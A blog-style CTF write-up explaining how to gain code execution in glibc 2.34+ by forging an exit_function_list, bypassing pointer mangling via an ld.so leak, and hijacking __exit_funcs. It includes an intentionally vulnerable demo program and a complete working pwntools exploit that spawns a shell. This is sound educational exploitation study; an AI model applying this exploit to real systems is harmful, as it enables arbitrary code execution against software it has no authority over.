---
title: "Exit Functions in LibC"
date: "2025-04-07T13:53:34-04:00"
tags: ["binex", "concepts"]
author: "AmeliaYeah"
draft: false
table-of-contents: true
toc-auto-numbering: true
---
## The RCE from Heap Exploitation problem

So, one time before I was doing a CTF. It was your standard binary exploitation challenge on the heap, nothing too out of the ordinary. I was performing the standard techniques (exploiting UAF, getting a write-what-where by making malloc return arbitrary addresses, etc.)

The binary, for context, had all the protections.
1. Full RELRO (Could not perform a GOT overwrite)
1. NX (Couldn't execute custom shellcode)
1. Stack Canary (Not like this matters; we're exploiting on the heap)
1. PIE (Self-explanatory)

Except..that's when I stumbled upon a problem. You see, back in the day, there would be these things called "hooks"; special portions of the binary that, whenever some function like malloc() or free() was ran, it would execute the addresses in those hooks and thus grant some form of RCE.

And that was great and all, basically being the standard for this sort of thing. [Until they got removed in LibC 2.34](https://developers.redhat.com/articles/2021/08/25/securing-malloc-glibc-why-malloc-hooks-had-go).

This problem ended up stumping me for quite some time because, what other alternative was there? If we're on the heap, we can pretty much only (reliably) get a leak from LibC itself but nothing else. How are we supposed to leverage *only* reliable access to the LibC address space and gain RCE? Is that even possible?

## \_\_exit\_funcs

During my research, I ended up using two sources that would ultimately help me better understand this topic. [This CTF Writeup](https://ctftime.org/writeup/34804) along with the [seperate document/article](https://binholic.blogspot.com/2017/05/notes-on-abusing-exit-handlers.html) they referenced. You are more than free to access these if you wish, but I'll go ahead and summarize them in a more easy to understand and simplified manner.

It may also help to look at [exit.h](https://elixir.bootlin.com/glibc/glibc-2.41/source/stdlib/exit.h) and [exit.c](https://elixir.bootlin.com/glibc/glibc-2.41/source/stdlib/exit.c) from the LibC source code. LibC 2.41 is used here, but the concept should make sense for most other versions >= 2.41

As seen from the `exit.h` and `exit.c` code:
1. There exists an `__exit_funcs` address which is a pointer to an `exit_function_list` struct. The struct being pointed to, as per the type, is a singly linked list, storing at most 32 `exit_function` structs.
1. Looking at the source code for `exit()`, the function is literally just a wrapper to `__run_exit_handlers()`, just automatically filling in all the internal data for us.
1. The `__run_exit_handlers` function interprets each `exit_function`, and ultimately executes it in multiple different ways according to the `flavor` enum/int value.

Seems great, right? We essentially just have some form of RCE right there for us. So, as a result, we can do the following:
1. Generate some `exit_function_list` struct (call it "A"), with it containing an `exit_function` of our choosing
	* Recommended to use the `ef_cxa` (4) enum value for `flavor`, as the actual function to execute is interpreted as `func(void* ptr, int status)`. This makes it possible to do `system("/bin/sh")` due to the first value being treated as a pointer, and system only takes one parameter anyway.
1. Place the address of A into `__exit_funcs` (since `__exit_funcs` is a pointer *to* the struct)
1. Pwned

But, enough with the theoretical side of things; let's get to the practicalities.

## Day in the Life of an Exit Function

Sparing the extra details of heap exploitation and whatnot, let's make a simple program with all protections enabled.

```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

//compatibility with pwntools
void setup() {
	setbuf(stdin, NULL);
	setbuf(stdout, NULL);
}

int main() {
	setup();

	printf("popen: %p\n", popen);
	while(1) {
		printf("What would you like to do? ");

		char* addr;
		scanf("%p", &addr);
		getchar();

		//exit
		if(addr == (char*)1) {
			exit(0);
			break;
		}

		//allocate memory
		if(addr == (char*)2) {
			char* ptr = malloc(100);
			fgets(ptr, 100, stdin);
			printf("%p\n", ptr);
			continue;
		}

		//read or write
		if(getchar() == 'r') {
			printf("READ: %lx\n", *(long*)addr);
		}else {
			scanf("%8s", (char*)addr);
		}
	}
}
```

It's essentially a proof of concept that simplifies all the prerequisites that will be simplified when utilizing this tactic (you have reliable LibC and heap access but nothing else, and the binary is fully protected).

You run it, it gives you a LibC leak, and lets you write to any address you choose by default. Specifying '1' exits, specifying '2' lets you write to some allocated portion on the heap. We have an ability to read/write the address. Simple enough.

Running it in GDB, we can go ahead and print out the actual exit function list. We get the following output (since, by default, there's only 1 exit function that actually gets handled (`_dl_fini`))

```as
pwndbg> x/8xg __exit_funcs
0x7ffff7f98fc0 <initial>:       0x0000000000000000      0x0000000000000001
0x7ffff7f98fd0 <initial+16>:    0x0000000000000004      0xab808ec58cc15c1d
0x7ffff7f98fe0 <initial+32>:    0x0000000000000000      0x0000000000000000
0x7ffff7f98ff0 <initial+48>:    0x0000000000000000      0x0000000000000000
```

We can see that the actual struct is located at `inital`. We see the following:
1. The first 8 bytes are the number 0, or NULL, meaning that this is the end of the `exit_functions_list` linked-list
1. The second 8 bytes are the number 1, meaning this is the first (and last) node in the list
1. The third and fourth 16 bytes are a single `exit_function`, with the first of the pair being 4 (the flavor; `ef_cxa`, corresponding to the enum), and the last being the actual function.

However, something's odd. The function should be a valid function...this doesn't look like an actual function. Why?


### Pointer Guard

That's because of one thing I didn't mention yet: Pointer Mangling! (You thought this was gonna be easy?)

Look at `exit.c` again and how it handles function addresses. More specifically, this line for handling `ef_cxa` (though it's present in all other flavors that use addresses):

```c
f->flavor = ef_free;
cxafct = f->func.cxa.fn;
arg = f->func.cxa.arg;
PTR_DEMANGLE (cxafct);
```

We see it's calling `PTR_DEMANGLE` on the actual function address. Since this binary is running on `x86_64` linux, we can view the [pointer_guard.h](https://elixir.bootlin.com/glibc/glibc-2.41/source/sysdeps/unix/sysv/linux/x86_64/pointer_guard.h#L31) file that defines this macro, and see the following:

```c
#  define PTR_MANGLE(reg)\
	xor __pointer_chk_guard_local(%rip), reg;\
    rol $2*LP_SIZE+1, reg
#  define PTR_DEMANGLE(reg)\
    ror $2*LP_SIZE+1, reg;\
    xor __pointer_chk_guard_local(%rip), reg
```

And knowing it's 64 bit, we can look at [x86lp_size.h](https://elixir.bootlin.com/glibc/glibc-2.41/source/sysdeps/x86_64/x86-lp_size.h#L22) to identify the `LP_SIZE` parameter: `8`.

Knowing `rol` and `ror` are just bitshift operations, to demangle a pointer, it simply bitshifts it right 17 (8\*2 + 1) times, then XORs it by a randomly-generated-on-runtime XOR key `__pointer_chk_guard_local(%rip)`. However, while this is an annoying protection, it shouldn't be difficult to reverse once we leak this encrypted address and obtain it's plaintext somehow.

As stated before, this function is `_dl_fini`, but unfortunately, it isn't an exported function. This means that we will need to manually calculate the offset ourselves instead of relying on the offset given to us by other exported common LibC functions.

After stepping through `__run_exit_handlers` until we get to the assembly instructions related to `PTR_DEMANGLE`, the following instruction tells us the plaintext address of `_dl_fini`:

```as
 	► 0x7ffff7dfca5a <__run_exit_handlers+314>    xor    rax, qword ptr fs:[0x30]        RAX => 0x7ffff7fcbe20 (_dl_fini) (0xae0ed5c04762c660 ^ 0xae0eaa3fb09e7840)
```

This is great! Now all we need to do is subtract the LibC base address from the plaintext and!---wait...uh oh.

```as
0x7ffff7db8000     0x7ffff7dbb000 rw-p     3000      0 [anon_7ffff7db8]
0x7ffff7dbb000     0x7ffff7de3000 r--p    28000      0 libc.so.6
0x7ffff7de3000     0x7ffff7f3d000 r-xp   15a000  28000 libc.so.6
0x7ffff7f3d000     0x7ffff7f93000 r--p    56000 182000 libc.so.6
0x7ffff7f93000     0x7ffff7f97000 r--p     4000 1d7000 libc.so.6
0x7ffff7f97000     0x7ffff7f99000 rw-p     2000 1db000 libc.so.6
0x7ffff7f99000     0x7ffff7fa6000 rw-p     d000      0 [anon_7ffff7f99]
```

```python
>>> 0x7ffff7fcbe20 > 0x7ffff7f99000
True
```

### Calculating \_dl\_fini from an ld.so base address leak

Do you see it? The address we leaked is bigger than the last address of the `libc.so.6` address space. This means `_dl_fini` isn't actually in `libc.so.6`, meaning it isn't at a fixed offset.

So, where does it belong to?

```as
0x7ffff7fc6000     0x7ffff7fc8000 r-xp     2000      0 [vdso]
0x7ffff7fc8000     0x7ffff7fc9000 r--p     1000      0 ld-linux-x86-64.so.2
0x7ffff7fc9000     0x7ffff7ff0000 r-xp    27000   1000 ld-linux-x86-64.so.2
0x7ffff7ff0000     0x7ffff7ffb000 r--p     b000  28000 ld-linux-x86-64.so.2
0x7ffff7ffb000     0x7ffff7ffd000 r--p     2000  33000 ld-linux-x86-64.so.2
0x7ffff7ffd000     0x7ffff7fff000 rw-p     2000  35000 ld-linux-x86-64.so.2
0x7ffffffde000     0x7ffffffff000 rw-p    21000      0 [stack]
```

```python
>>> 0x7ffff7fc8000 < 0x7ffff7fcbe20 < 0x7ffff7fff000
True
```

As we can see, surprisingly enough, the address we leaked is within the address space of `ld.so`. So...for the first time in, probably, ever, of my binex career..we'll need to find a leak to `ld.so`.

Now, this is rather unorthodox. Normally you're used to leaking out PIE addresses of the binary itself or LibC addresses. How in the world do we obtain an `ld.so` leak? Much less from LibC?

Well, the answer is rather simple. There's another address we can look at: `_rtld_global`.

```as
pwndbg> x/xg &_rtld_global
0x7ffff7ffd000 <_rtld_global>:  0x00007ffff7ffe2e0
```

```python
>>> 0x7ffff7fc8000 < 0x00007ffff7ffe2e0 < 0x7ffff7fff000
True
```

In short, `_rtld_global` itself doesn't matter; what does matter is that this is a link between LibC and `ld.so`. The actual `_rtld_global` struct itself is created and stored in the `ld.so` address space, while LibC's `_rtld_global` is essentially a pointer to this very struct.

This means we can essentially read out the value from LibC's `_rtld_global` to get an address in the `ld.so` address space, and thus, be able to get the `ld.so` base address.

In my exploit and demonstration from hereon out, I did not properly understand this struct, so I'll be using the first address *inside* the `_rtld_global` (in `ld.so`) struct (0x7ffff7ffe2e0). However, using the actual `_rtld_global` address itself (0x7ffff7ffd000) is also fine, as it also belongs in the `ld.so` memory space.

Now, we can go ahead and do the following:
1. Calculate the (consistent) offset between the leaked address and the current `ld.so` base address from GDB:
	* `0x00007ffff7ffe2e0 - 0x7ffff7fc8000 = 0x362e0`
1. Calculate the offset between the `_dl_fini` function and the base address of `ld.so` (again, from GDB):
	* `0x7ffff7fcbe20 - 0x7ffff7fc8000 = 0x3e20`
1. Whenever we leak the address again, subtract offset 0x362e0 to obtain the current `ld.so` base address
1. Add offset 0x3e20 to the base address to obtain `_dl_fini`
1. XOR this `_dl_fini` address with the leaked encrypted address (after it's been shifted right 17 times) to obtain the XOR key

And there we go, we've now managed to systematically figure out the XOR key! We're able to bypass pointer mangling now.

## Creating our very own EF

Now that everything's in place to bypass protections, and overall our understanding of exit functions is adequate, let's go ahead and create our exit function.

Remember that, in our case, using flavor `ef_cxa` is best given the format `func(void* arg, int status)`, since we intend our RCE to be a nice and simple `system("/bin/sh")`.

Since we have access to the heap, our goal is to allocate an entire `exit_function_list` struct and replace the value of `__exit_funcs` to that instead. Let's understand what we actually need to create.

```c
enum
{
  ef_free,	/* `ef_free' MUST be zero!  */
  ef_us,
  ef_on,
  ef_at,
  ef_cxa
};
struct exit_function_list
{
	struct exit_function_list *next;
	size_t idx;
	struct exit_function fns[32];
};
struct exit_function
{
	long int flavor;
	union
	{
		void (*at) (void);
		struct
	 	 {
	    	void (*fn) (int status, void *arg);
	    	void *arg;
	  	 } on;
		struct
	  	{
	    	void (*fn) (void *arg, int status);
	    	void *arg;
	    	void *dso_handle;
	  	} cxa;
	} func;
};
```

For our own `exit_function_list`, we will do the following values to satisfy the `exit_function_list` struct and our `system("/bin/sh")` exit function.
1. NULL (8 null bytes, given 64 bit binary) for the "next" ptr
1. 1 for the index
1. 4 for the flavor
1. Encrypted address of `system` for `fn`
1. "/bin/sh" string for `void* arg`
1. A bunch of null bytes; after `system("/bin/sh")` is called we don't care about binary corruption anyway so it doesn't really matter past the first 8.

We can simply allocate to the heap all those bytes, modify `__exit_funcs` to point to this newly allocated heap chunk, and then call `exit()` and have ourselves a brand new bash shell.

## Wrapping up

### Information

Incase you wanted to try this out, the only thing that really needs to match is the LibC and ld.so versions i'm using. The actual binary itself doesn't need to be identical since it's not involved in the exploit, so you can simply compile it yourself and use that.

The hashes of the libraries I used are:
* LibC version 2.40, sha1 `a03c98d0b534ed367baa0d4a4d4a94224b15a11a`
* ld.so version 2.40, sha1 `900bbb26d9de3755e363fa9f1024dae987361a8e`

### The Script

```python
from pwn import *

context.log_level = "info"

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
ld = ELF("/lib64/ld-linux-x86-64.so.2")
with process(["./vuln_poc"]) as p:
	#interact with the binary
	def interact(action, data):
		if action == "EXIT":
			p.sendlineafter(b"do? ", b"1")
			p.interactive()
		elif action == "ALLOC":
			p.sendlineafter(b"do? ", b"2")
			p.sendline(data)
			return int(p.recvline()[2:], 16) #return heap addr

		#handle read/write on address
		p.sendlineafter(b"do? ", hex(data["addr"]).encode("ascii"))
		p.sendline(action.encode("ascii"))

		#read/write
		if action == "r":
			return int(p.recvline()[len("read: "):],16)
		else:
			p.sendline(data["to_write"])

	#get libc base address from popen leak
	libc.address = int(p.recvline()[len("popen: 0x"):], 16)-libc.sym["popen"]
	log.info(f"LibC Address: {hex(libc.address)}")

	#leak encrypted address from where it resides
	#"initial" isn't exported, so this is the manual offset i calculated from libc
	initial = libc.address + 0x1ddfc0
	enc_addr = interact("r", {"addr": initial+16+8})
	log.info(f"Encrypted address: {hex(enc_addr)}")

	#leak _rtld_global to get the ld.so base address
	rtld_global_addr = interact("r", {"addr": libc.sym["_rtld_global"]})

	#dereference rtld_global 
	rtld_global_addr = interact("r", {"addr": rtld_global_addr})
	ld.address = rtld_global_addr-0x362e0
	_dl_fini = ld.address+0x3e20
	log.info(f"_dl_fini: {hex(_dl_fini)}")

	#utility functions
	rol = lambda val, r_bits, max_bits: (val << r_bits%max_bits) & (2**max_bits-1) | ((val & (2**max_bits-1)) >> (max_bits-(r_bits%max_bits)))
	ror = lambda val, r_bits, max_bits: ((val & (2**max_bits-1)) >> r_bits%max_bits) | (val << (max_bits-(r_bits%max_bits)) & (2**max_bits-1))
	crypt = lambda v,key: p64(rol(v ^ key, 0x11, 64))

	#get the XOR key
	xor_key = ror(enc_addr, 0x11, 64)^_dl_fini
	log.info(f"XOR key: {hex(xor_key)}")
	
	#we can now generate our exit function
	payl = b"".join([
		p64(0), #NULL
		p64(1), #idx
		p64(4), #flavor
		crypt(libc.sym["system"], xor_key), #system()
		p64(libc.address + 0x19ce43), #strings -t x libc.so.6 | grep -i /bin/sh

		#some nullbytes
		b"\x00"*3*8
	])
	heap_addr = interact("ALLOC", payl)
	log.info(f"Heap address of exit_functions_list struct: {hex(heap_addr)}")

	#modify __exit_funcs
	#offset in GDB: 0x7ffff7f97680-0x7ffff7dbb000 = 0x1dc680
	exit_funcs = libc.address+0x1dc680
	interact("w", {"addr": exit_funcs, "to_write": p64(heap_addr)})

	#exit
	interact("EXIT", 0)
	p.interactive()
```

```bash
[+] Starting local process './vuln_poc': pid 659312
[*] LibC Address: 0x7f3f37043000
[*] Encrypted address: 0xab657bbd9544b3e6
[*] _dl_fini: 0x7f3f3724de20
[*] XOR key: 0x59f32a8d8afa1482
[*] Heap address of exit_functions_list struct: 0x5610e80472a0
[*] Switching to interactive mode
$ ls
example.c  ld-linux-x86-64.so.2  libc.so.6  script.py  vuln_poc
```